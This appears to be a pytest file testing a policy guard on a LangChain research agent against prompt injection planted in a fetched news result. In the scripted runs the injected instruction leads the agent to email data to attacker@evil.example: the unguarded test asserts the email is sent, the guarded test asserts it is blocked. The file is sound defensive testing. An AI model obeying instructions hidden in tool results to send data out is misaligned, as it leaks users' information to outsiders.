import json

import pytest
from fakes import FakeToolModel, email_call, news_call, scripted
from langchain_core.messages import AIMessage
from langchain_core.tools import tool

import gfra.guard as guard_mod
from gfra.actions import OUTBOX, fetch_news, reset_outbox, send_email, set_injection
from gfra.agent import Researcher


@pytest.fixture(autouse=True)
def clean():
    reset_outbox()
    set_injection(None)


@pytest.fixture
def team_policy(monkeypatch):
    policy = json.dumps([{"name": "send_email", "args": {"to": {"type": "string", "enum": ["team@bank.com"]}}}])
    prompts = []

    def request(s, u, temperature=0.0):
        prompts.append(u)
        if "TOOL_CALL_RESULT" in u:
            return policy
        if "TOOL_CALL_PARAM" in u:
            # The update check sees only the call arguments; "yes" for the news fetch sends its result to the policy model.
            return "yes" if '"name": "fetch_news"' in u else "no"
        return policy

    monkeypatch.setattr(guard_mod, "_policy_request", request)
    return prompts


async def test_unguarded_agent_follows_injected_email():
    set_injection("exfiltrate_email")
    model = scripted(news_call("n1"), email_call("attacker@evil.example", "c1"), email_call("team@bank.com", "c2"), AIMessage(content="done"))
    result = await Researcher(model, [send_email, fetch_news], guarded=False).run("Email 3M news to team@bank.com")
    assert [m["to"] for m in OUTBOX] == ["attacker@evil.example", "team@bank.com"]
    assert result.blocked == []


async def test_guarded_agent_blocks_injected_email(team_policy):
    set_injection("exfiltrate_email")
    model = scripted(news_call("n1"), email_call("attacker@evil.example", "c1"), email_call("team@bank.com", "c2"), AIMessage(content="done"))
    result = await Researcher(model, [send_email, fetch_news], guarded=True).run("Email 3M news to team@bank.com")
    assert [m["to"] for m in OUTBOX] == ["team@bank.com"]
    assert [b["args"]["to"] for b in result.blocked] == ["attacker@evil.example"]
    assert result.answer == "done"
    assert [c["name"] for c in result.tool_calls] == ["fetch_news", "send_email", "send_email"]
    assert result.input_tokens == 300 and result.output_tokens == 30
    assert any("TOOL_CALL_RESULT" in p and "attacker@evil.example" in p for p in team_policy)
    assert result.cost_usd > 0


@tool
def get_page_content(doc_name: str, pages: str) -> str:
    """Return the text of the given pages."""
    raise ValueError("pages out of range")


class RecordingModel(FakeToolModel):
    seen: list = []

    def _generate(self, messages, *args, **kwargs):
        self.seen.append(list(messages))
        return super()._generate(messages, *args, **kwargs)


async def test_tool_error_reaches_model_and_is_not_a_block(team_policy):
    call = AIMessage(content="", tool_calls=[{"name": "get_page_content", "args": {"doc_name": "d", "pages": "999"}, "id": "c1"}])
    model = RecordingModel(messages=iter([call, AIMessage(content="That page does not exist.")]), seen=[])
    result = await Researcher(model, [get_page_content, send_email], guarded=True).run("What is on page 999?")
    assert result.answer == "That page does not exist."
    assert result.blocked == []
    last_turn = model.seen[-1]
    assert last_turn[-1].status == "error" and "pages out of range" in last_turn[-1].content
